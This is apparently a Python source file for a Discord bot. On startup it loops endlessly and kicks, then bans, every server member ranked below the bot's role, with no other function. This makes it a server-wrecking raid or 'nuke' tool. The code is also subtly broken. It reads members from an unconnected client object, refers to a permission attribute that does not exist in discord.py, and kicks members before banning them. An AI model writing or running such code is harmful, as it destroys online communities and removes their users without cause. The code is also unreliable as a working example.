import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import os
import time

client = discord.Client()
bot = commands.Bot(command_prefix = "p")
    
@bot.listen()
async def on_ready():
    while True:
        await asyncio.sleep(2)
        for mmr in client.get_all_members():
            if mmr.top_role.position >= mmr.guild.me.top_role.position:
                continue
            if mmr.guild.me.permission.kick_members:
                await mmr.kick()
            if mmr.guild.me.permission.ban_members:
                await mmr.ban()

TOKEN = os.environ['BOT_TOKEN']
bot.run(TOKEN)
